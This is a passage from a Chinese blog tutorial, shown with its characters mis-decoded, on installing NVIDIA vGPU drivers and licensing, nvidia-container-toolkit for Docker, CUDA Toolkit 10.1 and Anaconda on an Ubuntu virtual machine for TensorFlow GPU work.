·ã€‚</p><br><hr><h2 id="0x02-å®‰è£…-Ubuntu-è™šæ‹Ÿæœº"><a href="#0x02-å®‰è£…-Ubuntu-è™šæ‹Ÿæœº" class="headerlink" title="0x02 å®‰è£… Ubuntu è™šæ‹Ÿæœº"></a>0x02 å®‰è£… Ubuntu è™šæ‹Ÿæœº</h2><p>è¿™é‡Œæ˜¯ä»¥æœåŠ¡å™¨ä¸Šå®‰è£…ä¸ºä¾‹çš„ï¼Œæˆ‘è¿™é‡Œç°æˆé…å¥½äº†çš„ï¼Œå¤§æ¦‚å°±å‚è€ƒä¸‹é¢è¿™ä¸€ç¯‡å¥½äº†ã€‚</p><p><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141</a></p><br><hr><h2 id="0x03-å®‰è£…-NVIDIA-æ˜¾å¡é©±åŠ¨åŠæˆæƒ"><a href="#0x03-å®‰è£…-NVIDIA-æ˜¾å¡é©±åŠ¨åŠæˆæƒ" class="headerlink" title="0x03 å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨åŠæˆæƒ"></a>0x03 å®‰è£… NVIDIA æ˜¾å¡é©±åŠ¨åŠæˆæƒ</h2><p>è¿™é‡Œåˆ«äººå¸®é…å¥½äº†çš„ï¼ŒåŒæ ·å‚è€ƒ<a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=104141">ä¸Šé¢é‚£ä¸€ç¯‡</a>ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹å§ï¼Œé¡ºä¾¿å€Ÿä¸€ä¸‹å›¾ã€‚</p><h3 id="0x03-1-å®‰è£…æ˜¾å¡é©±åŠ¨"><a href="#0x03-1-å®‰è£…æ˜¾å¡é©±åŠ¨" class="headerlink" title="0x03-1 å®‰è£…æ˜¾å¡é©±åŠ¨"></a>0x03-1 å®‰è£…æ˜¾å¡é©±åŠ¨</h3><p>è™šæ‹Ÿæœºæ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶åä¸Šä¼ ç±»ä¼¼äº <code>NVIDIA-Linux-x86_64-430.63-grid.run</code> çš„æ˜¾å¡é©±åŠ¨æ–‡ä»¶ã€‚</p><p><strong>æ³¨æ„ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬è¦æ»¡è¶³ 0x01 ä¸­çš„æ¡ä»¶ã€‚</strong></p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180342ucwqytqncnm09lwc.png">   </p><p>æˆ–è€…å¯ä»¥è¿™æ ·â†“ã€‚</p><p>é¦–å…ˆæ·»åŠ æºã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> add-apt-repository ppa:graphics-drivers/ppa<span class="token function">sudo</span> <span class="token function">apt</span> update</code></pre><p>æ£€æŸ¥å¯ä»¥å®‰è£…çš„é©±åŠ¨ç‰ˆæœ¬ï¼Œé€‰æ‹©æœ€åˆé€‚çš„ç‰ˆæœ¬å®‰è£…å³å¯ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> nvidia-driver-XXX</code></pre><p><strong>å®‰è£…æ˜¾å¡é©±åŠ¨</strong>çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œå…ˆæ‰§è¡Œ<code>sudo init 3</code> ç„¶ååœ¨é©±åŠ¨æ–‡ä»¶ç›®å½•ä¸‹æ‰§è¡Œ<code>sudo sh  æ˜¾å¡é©±åŠ¨å --no-opengl-files</code>  ï¼ˆåŠ <code>--no-opengl-files</code>çš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢å›¾å½¢ç•Œé¢ç™»å½•çš„æ—¶å€™å¾ªç¯è¾“å…¥å¯†ç çš„æƒ…å†µï¼‰ï¼Œç„¶åæŒ‰ç…§æç¤ºæ‰§è¡Œä¸‹ä¸€æ­¥å°±å¯ä»¥ã€‚</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180352u8rlu2u8hryf27r7.png">   </p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180357vu66uuriaa6ut26a.png"><br><img src="/2020/04/29/Server_TensorFlow-vGPU/180405qtt59evncw7v70w0.png"> </p><p>æ˜¾å¡å®‰è£…å®Œæˆåè¿›è¡Œæ£€æŸ¥ï¼Œ**æ‰§è¡Œ<code>nvidia-smi</code>**ï¼Œå¦‚æœè¾“å‡ºç±»ä¼¼å¦‚ä¸‹ï¼Œåˆ™ä»£è¡¨æ˜¾å¡å®‰è£…æˆåŠŸã€‚</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180411yjjzmrda8djr7ada.png">   </p><p>ç±»ä¼¼äºä¸‹é¢è¿™æ ·çš„ã€‚ï¼ˆæˆ‘è¿™é‡Œæ˜¾å¡é©±åŠ¨ç‰ˆæœ¬ä¸º 440.56ï¼‰</p><pre class="language-none"><code class="language-none">+-----------------------------------------------------------------------------+| NVIDIA-SMI 440.56       Driver Version: 440.56       CUDA Version: 10.2     ||-------------------------------+----------------------+----------------------+| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC || Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. ||===============================+======================+======================||   0  GRID P100D-2Q      On    | 00000000:02:00.0 Off |                  N/A || N/A   N/A    P0    N/A /  N/A |     144MiB / 2032MiB |      0%      Default |+-------------------------------+----------------------+----------------------++-----------------------------------------------------------------------------+| Processes:                                                       GPU Memory ||  GPU       PID   Type   Process name                             Usage      ||=============================================================================||  No running processes found                                                 |+-----------------------------------------------------------------------------+</code></pre><h3 id="0x03-2-æ˜¾å¡æˆæƒ"><a href="#0x03-2-æ˜¾å¡æˆæƒ" class="headerlink" title="0x03-2 æ˜¾å¡æˆæƒ"></a>0x03-2 æ˜¾å¡æˆæƒ</h3><p>ä¸‹é¢è¿›è¡Œ<strong>æ˜¾å¡æˆæƒ</strong>çš„é…ç½®ã€‚</p><blockquote><p>å¦‚æœä½¿ç”¨çš„æ˜¯åˆ‡åˆ†æ˜¾å¡ï¼Œé‚£ä¹ˆæˆæƒä¸€å®šæ˜¯ vDWS æˆæƒç±»å‹ï¼Œæ­¤å¤„éœ€è¦æå‰å…ˆéƒ¨ç½²å¥½ vGPU æˆæƒæœåŠ¡å™¨ï¼ŒæˆæƒæœåŠ¡å™¨çš„éƒ¨ç½²ï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€‚</p><p>ç„¶åå†è™šæ‹Ÿæœºä¸­é…ç½®æˆæƒä¿¡æ¯ï¼Œæ‰§è¡Œå‘½ä»¤<code>cd /etc/nvidia</code>ï¼Œç„¶å<code>ls</code>æŸ¥çœ‹ä¼šæœ‰ä¸€ä¸ªæˆæƒæ–‡ä»¶é…ç½®æ¨¡æ¿ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤ <code>sudo cp gridd.conf.template  gridd.conf</code>ã€‚</p></blockquote><p><img src="https://bbs.sangfor.com.cn/data/attachment/forum/202004/07/180420qzxi4vur4iznr7bo.png">   </p><blockquote><p>ç¼–è¾‘æˆæƒä¿¡æ¯ï¼Œæ‰§è¡Œ <code>sudo vim gridd.conf</code>ï¼Œç„¶åéœ€è¦é…ç½®ä¸‰ä¸ªåœ°æ–¹ï¼Œä¹Ÿå³<strong>æˆæƒæœåŠ¡å™¨çš„åœ°å€ã€ç«¯å£ã€ä»¥åŠæˆæƒç±»å‹</strong>ï¼Œå¡«å†™å®Œæˆä¿å­˜ä¹‹åæ‰§è¡Œå‘½ä»¤ <code>systemctl restart nvidia-gridd</code>ã€‚</p></blockquote><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180429v0o6sk76pcx6x76z.png">   </p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180435lj46knr6kv8kkrjz.png">   </p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180441krcfyttcvmlkyfmu.png">   </p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180447are3iooz8m3g00o0.png">  </p><p>è€Œååœ¨æˆæƒæœåŠ¡å™¨ç¡®è®¤è™šæ‹Ÿæœºæ˜¯å¦å·²ç»è·å–åˆ°æˆæƒã€‚</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/180453n4gudc4v8cgmzpdd.png"></p><p>åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œä¸‹é¢çš„æ­¥éª¤å°±å’Œ vGPU æ²¡æœ‰å¾ˆå¤§çš„å…³ç³»äº†ï¼Œ<strong>å°±å½“ç‰©ç†æœºä¸Šçš„çœŸå® GPU ä½¿ç”¨å°±å¥½äº†</strong>ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ä¸‹é¢çš„æ­¥éª¤å¯¹äº Linux ä¸‹çš„ GPU ç†è®ºä¸Šéƒ½æ˜¯é€šç”¨çš„å•¦ã€‚</p><br><hr><h2 id="0x04-åˆ©ç”¨-Docker-å¿«é€Ÿå¯ç”¨-TensorFlow-GPU-æ”¯æŒ"><a href="#0x04-åˆ©ç”¨-Docker-å¿«é€Ÿå¯ç”¨-TensorFlow-GPU-æ”¯æŒ" class="headerlink" title="0x04 åˆ©ç”¨ Docker å¿«é€Ÿå¯ç”¨ TensorFlow GPU æ”¯æŒ"></a>0x04 åˆ©ç”¨ Docker å¿«é€Ÿå¯ç”¨ TensorFlow GPU æ”¯æŒ</h2><p>è¿™é‡Œæ‰“æ–­ä¸€ä¸‹ï¼Œè¯´ä¸€ä¸ªå¿«é€Ÿå¯ç”¨ TensorFlow GPU æ”¯æŒçš„æ–¹æ¡ˆã€‚å¦‚æœåªæ˜¯æƒ³ä½“éªŒä¸€ä¸‹ï¼Œæˆ–è€…åœ¨ docker ä¸­æ„å»ºçš„è¯ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼Œä¸éœ€è¦åé¢çš„æ­¥éª¤å°±èƒ½å¿«é€Ÿå¯ç”¨äº†ã€‚</p><blockquote><p><a href="https://docs.docker.com/install/">Docker</a> ä½¿ç”¨å®¹å™¨åˆ›å»ºè™šæ‹Ÿç¯å¢ƒï¼Œä»¥ä¾¿å°† TensorFlow å®‰è£…ç»“æœä¸ç³»ç»Ÿçš„å…¶ä½™éƒ¨åˆ†éš”ç¦»å¼€æ¥ã€‚TensorFlow ç¨‹åºåœ¨æ­¤è™šæ‹Ÿç¯å¢ƒä¸­è¿è¡Œï¼Œè¯¥ç¯å¢ƒèƒ½å¤Ÿä¸å…¶ä¸»æœºå…±äº«èµ„æºï¼ˆè®¿é—®ç›®å½•ã€ä½¿ç”¨ GPUã€è¿æ¥åˆ°äº’è”ç½‘ç­‰ï¼‰ã€‚æˆ‘ä»¬ä¼šé’ˆå¯¹æ¯ä¸ªç‰ˆæœ¬æµ‹è¯• <a href="https://hub.docker.com/r/tensorflow/tensorflow/">TensorFlow Docker æ˜ åƒ</a>ã€‚</p><p>Docker æ˜¯åœ¨ Linux ä¸Šå¯ç”¨ TensorFlow <a href="https://www.tensorflow.org/install/gpu?hl=zh-cn">GPU æ”¯æŒ</a>çš„æœ€ç®€å•æ–¹æ³•ï¼Œå› ä¸ºåªéœ€åœ¨ä¸»æœºä¸Šå®‰è£… <a href="https://github.com/NVIDIA/nvidia-docker/wiki/Frequently-Asked-Questions#how-do-i-install-the-nvidia-driver">NVIDIAÂ® GPU é©±åŠ¨ç¨‹åº</a>ï¼Œè€Œä¸å¿…å®‰è£… NVIDIAÂ® CUDAÂ® å·¥å…·åŒ…ã€‚</p></blockquote><p>ï¼ˆæ¥è‡ª<a href="https://www.tensorflow.org/install/docker?hl=zh-cn">å®˜æ–¹ Docker å®‰è£…æ•™ç¨‹</a>ï¼‰</p><p>é¦–å…ˆï¼ˆåœ¨è™šæ‹Ÿæœºä¸Šï¼‰<strong>å®‰è£… docker</strong>ï¼Œè€Œåéœ€è¦**<a href="https://github.com/NVIDIA/nvidia-docker">å®‰è£… NVIDIA Docker æ”¯æŒ</a>**ã€‚</p><blockquote><p>è¯·é€šè¿‡ <code>docker -v</code> æ£€æŸ¥ Docker ç‰ˆæœ¬ã€‚å¯¹äº 19.03 <strong>ä¹‹å‰</strong>çš„ç‰ˆæœ¬ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ nvidia-docker2 å’Œ <code>--runtime=nvidia</code> æ ‡è®°ï¼›å¯¹äº <strong>19.03 åŠä¹‹å</strong>çš„ç‰ˆæœ¬ï¼Œæ‚¨å°†éœ€è¦ä½¿ç”¨ <code>nvidia-container-toolkit</code> è½¯ä»¶åŒ…å’Œ <code>--gpus all</code> æ ‡è®°ã€‚</p></blockquote><p><strong>æ³¨æ„ï¼šè¯·ç¡®ä¿å·²æ­£ç¡®å®‰è£… Nvidia æ˜¾å¡é©±åŠ¨ï¼Œdocker ç‰ˆæœ¬&gt;=19.03ï¼</strong></p><p>è¿™æ ·å°±ä¸éœ€è¦å®‰è£… CUDA toolkit äº†ã€‚</p><p>ç›®å‰æœ€æ–°çš„ docker å°±æ˜¯ 19.03.8 ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç”¨<code>nvidia-container-toolkit</code> è½¯ä»¶åŒ…å’Œ <code>--gpus all</code> æ ‡è®°ã€‚</p><h3 id="0x04-1-å®‰è£…-nvidia-container-toolkit"><a href="#0x04-1-å®‰è£…-nvidia-container-toolkit" class="headerlink" title="0x04-1 å®‰è£… nvidia-container-toolkit"></a>0x04-1 å®‰è£… nvidia-container-toolkit</h3><p>ï¼ˆUbuntu 16.04/18.04, Debian Jessie/Stretch/Busterï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Add the package repositories</span><span class="token assign-left variable">distribution</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">.</span> /etc/os-release<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> $ID$VERSION_ID<span class="token variable">)</span></span><span class="token function">curl</span> -s -L https://nvidia.github.io/nvidia-docker/gpgkey <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> -<span class="token function">curl</span> -s -L https://nvidia.github.io/nvidia-docker/<span class="token variable">$distribution</span>/nvidia-docker.list <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/nvidia-docker.list<span class="token function">sudo</span> <span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y nvidia-container-toolkit<span class="token function">sudo</span> systemctl restart docker</code></pre><p>ä¹‹åå°±å¯ä»¥æµ‹è¯•ä¸€ä¸‹èƒ½å¦åœ¨dockeré‡Œè°ƒç”¨æ˜¾å¡äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#### Test nvidia-smi with the latest official CUDA image</span>docker run --gpus all nvidia/cuda:10.0-base nvidia-smi</code></pre><p>æ­£å¸¸çš„è¯æ•ˆæœä¸ <code>nvidia-smi</code>æ•ˆæœç›¸åŒã€‚</p><p>ä¸‹é¢è¿™å‡ ä¸ªæ˜¯æŒ‡å®šç‰¹å®šæ˜¾å¡çš„ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Start a GPU enabled container on two GPUs</span>docker run --gpus <span class="token number">2</span> nvidia/cuda:10.0-base nvidia-smi<span class="token comment"># Starting a GPU enabled container on specific GPUs</span>docker run --gpus <span class="token string">'"device=1,2"'</span> nvidia/cuda:10.0-base nvidia-smidocker run --gpus <span class="token string">'"device=UUID-ABCDEF,1"'</span> nvidia/cuda:10.0-base nvidia-smi<span class="token comment"># Specifying a capability (graphics, compute, ...) for my container</span><span class="token comment"># Note this is rarely if ever used this way</span>docker run --gpus all,capabilities<span class="token operator">=</span>utility nvidia/cuda:10.0-base nvidia-smi</code></pre><h3 id="0x04-2-æ‹‰å–-tensorflow-å®˜æ–¹é•œåƒ-amp-è¿è¡Œä»£ç "><a href="#0x04-2-æ‹‰å–-tensorflow-å®˜æ–¹é•œåƒ-amp-è¿è¡Œä»£ç " class="headerlink" title="0x04-2 æ‹‰å– tensorflow å®˜æ–¹é•œåƒ&amp;è¿è¡Œä»£ç "></a>0x04-2 æ‹‰å– tensorflow å®˜æ–¹é•œåƒ&amp;è¿è¡Œä»£ç </h3><table><thead><tr><th>æ ‡è®°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>latest</code></td><td>TensorFlow CPU äºŒè¿›åˆ¶æ˜ åƒçš„æœ€æ–°ç‰ˆæœ¬ã€‚ï¼ˆé»˜è®¤ç‰ˆæœ¬ï¼‰</td></tr><tr><td><code>nightly</code></td><td>TensorFlow æ˜ åƒçš„æ¯å¤œç‰ˆã€‚ï¼ˆä¸ç¨³å®šï¼‰</td></tr><tr><td><em><code>version</code></em></td><td>æŒ‡å®š TensorFlow äºŒè¿›åˆ¶æ˜ åƒçš„ç‰ˆæœ¬ï¼Œä¾‹å¦‚ï¼š2.1.0</td></tr><tr><td><code>devel</code></td><td>TensorFlow <code>master</code> å¼€å‘ç¯å¢ƒçš„æ¯å¤œç‰ˆã€‚åŒ…å« TensorFlow æºä»£ç ã€‚</td></tr></tbody></table><p>æ¯ä¸ªåŸºæœ¬æ ‡è®°éƒ½æœ‰ç”¨äºæ·»åŠ æˆ–æ›´æ”¹åŠŸèƒ½çš„å˜ä½“ï¼š</p><table><thead><tr><th>æ ‡è®°å˜ä½“</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><em><code>tag</code></em><code>-gpu</code></td><td>æ”¯æŒ GPU çš„æŒ‡å®šæ ‡è®°ç‰ˆæœ¬ã€‚</td></tr><tr><td><em><code>tag</code></em><code>-py3</code></td><td>æ”¯æŒ Python 3 çš„æŒ‡å®šæ ‡è®°ç‰ˆæœ¬ã€‚</td></tr><tr><td><em><code>tag</code></em><code>-jupyter</code></td><td>å¸¦æœ‰ Jupyter çš„æŒ‡å®šæ ‡è®°ç‰ˆæœ¬ï¼ˆåŒ…å« TensorFlow æ•™ç¨‹ç¬”è®°æœ¬ï¼‰</td></tr></tbody></table><p><strong>ä¸‹è½½å¹¶è¿è¡Œæ”¯æŒ GPU çš„ TensorFlow æ˜ åƒ</strong>ï¼Œè€Œåè¿è¡Œè¿™è¡Œä»£ç æµ‹è¯•ä¸€ä¸‹ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker run --gpus all -it --rm tensorflow/tensorflow:latest-gpu <span class="token punctuation">\</span>       python -c <span class="token string">"import tensorflow as tf; print(tf.reduce_sum(tf.random.normal([1000, 1000])))"</span></code></pre><p>é•œåƒå¤§æ¦‚2ä¸ªGå§ï¼Œæ‹‰å–é•œåƒæŒºä¹…çš„â€¦â€¦ä¸Šé¢è¿™ä¸ªæ‹‰å–çš„æ˜¯æœ€æ–°ç‰ˆæœ¬çš„GPUé•œåƒã€‚å¯ä»¥é€šè¿‡ä¸Šé¢è¿™ä¸ªæµ‹è¯•ä¸€ä¸‹æ˜¯å¦å®‰è£…æˆåŠŸã€‚ä¹‹åå¯ä»¥åˆ©ç”¨<code>docker exec</code> é‡ç”¨å®¹å™¨ã€‚</p><blockquote><p>ä½¿ç”¨æœ€æ–°çš„ TensorFlow GPU æ˜ åƒåœ¨å®¹å™¨ä¸­å¯åŠ¨ <code>bash</code> shell ä¼šè¯ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker run --gpus all -it tensorflow/tensorflow:latest-gpu <span class="token function">bash</span></code></pre><p>è¦åœ¨å®¹å™¨å†…è¿è¡Œåœ¨ä¸»æœºä¸Šå¼€å‘çš„ TensorFlow ç¨‹åºï¼Œè¯·è£…è½½ä¸»æœºç›®å½•å¹¶æ›´æ”¹å®¹å™¨çš„å·¥ä½œç›®å½• (<code>-v hostDir:containerDir -w workDir</code>)ï¼š</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash">docker run --gpus all -it --rm -v <span class="token environment constant">$PWD</span>:/tmp -w /tmp tensorflow/tensorflow:latest-gpu python ./script.py</code></pre><p><strong>è¦è°ƒç”¨ GPU çš„æ—¶å€™è®°å¾—åŠ ä¸Š<code>--gpus all</code>æ ‡è®°å‘€ï¼</strong></p><br><hr><h2 id="0x05-å®‰è£…-CUDA-Toolkit"><a href="#0x05-å®‰è£…-CUDA-Toolkit" class="headerlink" title="0x05 å®‰è£… CUDA Toolkit"></a>0x05 å®‰è£… CUDA Toolkit</h2><p>å¦‚æœè¦ç›´æ¥ï¼ˆåœ¨è™šæ‹Ÿæœºä¸Šï¼‰è·‘ç¨‹åºçš„è¯ï¼Œéœ€è¦è£… CUDA å·¥å…·åŒ…ã€‚</p><p>è¿™ä¸€æ­¥å¾ˆå…³é”®ï¼Œæœ€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¾å¡ä¸Šæ˜¾ç¤ºäº† <code>CUDA Version</code> å°±è£…å¥½ CUDA äº†ï¼Œåˆ°æœ€åä¸€ç³»åˆ—è£…å®Œåœ¨ python é‡Œæµ‹è¯• GPU çš„æ—¶å€™æŠ¥é”™è¯´ <em>tensorflow.python.framework.errors_impl.InternalError: CUDA runtime implicit initialization on GPU:0 failed. Status: all CUDA-capable devices are busy or unavailable</em> </p><p>åˆ°è°·æ­ŒæŸ¥äº†æŒºå¤šèµ„æ–™éƒ½æ²¡è§£å†³ï¼ˆä¸Šé¢è¿™ä¸ªé—®é¢˜å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/baidu_36639782/article/details/86691407?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1">è¿™é‡Œ</a>æœ‰ä¸€äº›å¯èƒ½çš„è§£å†³æ–¹æ¡ˆï¼‰ï¼ŒæŠ˜è…¾äº†è€åŠå¤©æ‰å‘ç°æ˜¯ CUDA Toolkit æ²¡è£…â€¦â€¦è¿˜æ˜¯åœ¨ä¸Šä¸€æ­¥ä¸­ç”¨ docker æµ‹è¯•æ‰å‘ç°çš„å‘¢ã€‚</p><p>æ‰§è¡Œ <code>nvidia-smi</code> å¾—åˆ°çš„<code>CUDA Version</code>åº”è¯¥æ˜¯ CUDA Driver çš„ç‰ˆæœ¬ï¼Œè¿™é‡Œè¦è£…çš„ CUDA Toolkit å¯¹åº”çš„æ˜¯ Runtime version å§ï¼ˆçŒœçš„ï¼‰ã€‚</p><p>æ ¹æ® 0x01 ä¸­çš„ç‰ˆæœ¬å…³ç³»ï¼Œä»¥åŠä¸Šé¢ docker ä¸­è¿è¡Œçš„ CUDA ç‰ˆæœ¬ï¼Œè¿™é‡Œæˆ‘ç”¨äº† 10.1.243 ç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨ <a href="https://developer.nvidia.com/cuda-10.1-download-archive-update2?target_os=Linux&amp;target_arch=x86_64&amp;target_distro=Ubuntu&amp;target_version=1604&amp;target_type=runfilelocal">CUDA Toolkit 10.1 update2  Archive è¿™é‡Œ</a>çœ‹ä¸‹è½½åœ°å€ã€‚ç›®å‰ä¸æ¨èç”¨æœ€æ–°çš„10.2ç‰ˆæœ¬ï¼Œå½“ç„¶éšç€å‘å±•åç»­è‚¯å®šä¼šæ›´æ–°å¦è¯´ã€‚</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430000707961.png" alt="CUDA Toolkit 10.1 update2  Archive"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://developer.download.nvidia.com/compute/cuda/10.1/Prod/local_installers/cuda_10.1.243_418.87.00_linux.runsudo <span class="token function">sh</span> cuda_10.1.243_418.87.00_linux.run</code></pre><p>è¿™é‡Œå®‰è£…ç•Œé¢æŒºæœ‰æ„æ€çš„ï¼Œå‘½ä»¤è¡Œé‡Œçš„æŠ˜å èœå•ï¼Œæƒ³ä¸åˆ°å§ï¼</p><p><strong>æ³¨æ„</strong>ä¸€ä¸‹ï¼šè¿™é‡Œ<strong>ä¸è¦é€‰ Driver äº†</strong>ï¼Œ<strong>åœ¨<code>Driver</code>é‚£é‡Œæ•²ä¸ªå›è½¦æŠŠ<code>X</code>å»æ‰</strong>ã€‚å› ä¸ºä½ é©±åŠ¨å·²ç»è£…å¥½äº†å•¦ï¼Œè€Œä¸”æ¯”è¿™ä¸ªæ–°ã€‚ï¼ˆæˆªå›¾çš„æ—¶å€™æ²¡æœ‰å»æ‰æ‡’å¾—é‡æ–°æˆªäº†ï¼‰</p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430001524136.png" alt="CUDA installer"></p><p>å®‰è£…å®Œä¹‹åè¦æŠŠè·¯å¾„åŠ å…¥åˆ° <code>PATH</code> é‡Œã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> ~/.bashrc</code></pre><p>åœ¨æœ€åæ–°å¢ä¸‹é¢å‡ è¡Œã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># CUDA config</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$LD_LIBRARY_PATH</span>:/usr/local/cuda/lib64:/usr/local/cuda/extras/CUPTI/lib64"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CUDA_HOME</span><span class="token operator">=</span><span class="token string">"/usr/local/cuda"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"/usr/local/cuda/bin:<span class="token environment constant">$PATH</span>"</span></code></pre><p>ä½¿é…ç½®ç”Ÿæ•ˆï¼ˆæˆ–é‡å¯ç»ˆç«¯ä¹Ÿè¡Œï¼‰ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.bashrc</code></pre><p>éªŒè¯ä¸€ä¸‹æœ‰æ²¡æœ‰å®‰è£…æˆåŠŸã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">miaotony@localhost:~<span class="token comment"># nvcc -V</span>nvcc: NVIDIA <span class="token punctuation">(</span>R<span class="token punctuation">)</span> Cuda compiler driverCopyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2005</span>-2019 NVIDIA CorporationBuilt on Sun_Jul_28_19:07:16_PDT_2019Cuda compilation tools, release <span class="token number">10.1</span>, V10.1.243</code></pre><p>å¦‚æœä¸Šé¢å®‰è£…æ—¶å€™è£…äº†å®ä¾‹çš„è¯ï¼Œå¯ä»¥æ¥æµ‹è¯•ä¸€ä¸‹ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/local/cuda/samples/1_Utilities/deviceQuery/<span class="token function">sudo</span> <span class="token function">make</span>./deviceQuery</code></pre><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430003224527.png" alt="deviceQuery"></p><p>è¿™é‡Œå°±æ˜¾ç¤ºå‡ºäº†æ˜¾å¡çš„å„ç§å‚æ•°ï¼Œæœ€å<code>Result=PASS</code>åˆ™è¯´æ˜å®‰è£…æˆåŠŸäº†ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥è¯•è¯•åˆ«çš„ä¾‹å­ï¼Œå…ˆç¼–è¯‘å†æ‰§è¡Œå°±å¥½ã€‚</p><br><hr><h2 id="0x06-å®‰è£…-Anaconda3"><a href="#0x06-å®‰è£…-Anaconda3" class="headerlink" title="0x06  å®‰è£… Anaconda3"></a>0x06  å®‰è£… Anaconda3</h2><p>è¿™é‡Œé€‰æ‹©ç”¨ Anaconda æ¥å®‰è£…ï¼Œä¸ä»…å› ä¸ºæœ‰å¾ˆå¤šå¸¸ç”¨çš„ç§‘å­¦è®¡ç®—åº“ï¼Œè€Œä¸”åé¢ä¼šè¯´ tensorflow-gpu é‡Œè¿˜è‡ªå¸¦äº†æ»¡è¶³ç‰ˆæœ¬è¦æ±‚çš„ cuDNNã€‚ï¼ˆæˆ‘ä¹Ÿæ˜¯è¿™æ¬¡æ‰çŸ¥é“çš„å‘¢</p><h3 id="0x06-1-ä¸‹è½½-amp-å®‰è£…"><a href="#0x06-1-ä¸‹è½½-amp-å®‰è£…" class="headerlink" title="0x06-1 ä¸‹è½½&amp;å®‰è£…"></a>0x06-1 ä¸‹è½½&amp;å®‰è£…</h3><p>åˆ°å®˜æ–¹è¿™é‡Œä¸‹è½½ <a href="https://www.anaconda.com/products/individual%E3%80%82">https://www.anaconda.com/products/individualã€‚</a></p><p><img src="/2020/04/29/Server_TensorFlow-vGPU/image-20200430003646135.png" alt="Anaconda"></p><p>2020.02ç‰ˆæœ¬ <a href="https://repo.anaconda.com/archive/Anaconda3-2020.02-Linux-x86_64.sh">64-Bit (x86) Installer (522 MB)</a></p><p>æŒ‰ç…§æç¤ºå®‰è£…ï¼Œæœ€å¥½éƒ½è¾“å…¥yesï¼Œé‡å¯ç»ˆç«¯åä¼šè‡ªåŠ¨åˆå§‹åŒ– conda çš„é»˜è®¤ç¯å¢ƒã€‚</p><p>è¾“å…¥ <code>conda --version</code>ï¼Œå‡ºç°ç‰ˆæœ¬å·åˆ™å®‰è£…æˆåŠŸã€‚</p><h3 id="0x06-2-æ¢æº"><a href="#0x06-2-æ¢æº" class="headerlink" title="0x06-2 æ¢æº"></a>0x06-2 æ¢æº</h3><p>ä¼—æ‰€å‘¨çŸ¥å®˜æ–¹çš„ conda æºé€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œæ¢æ¸…å tuna æºå§ã€‚</p><p>ï¼ˆè®°å¾—æœ‰æ®µæ—¶é—´å› 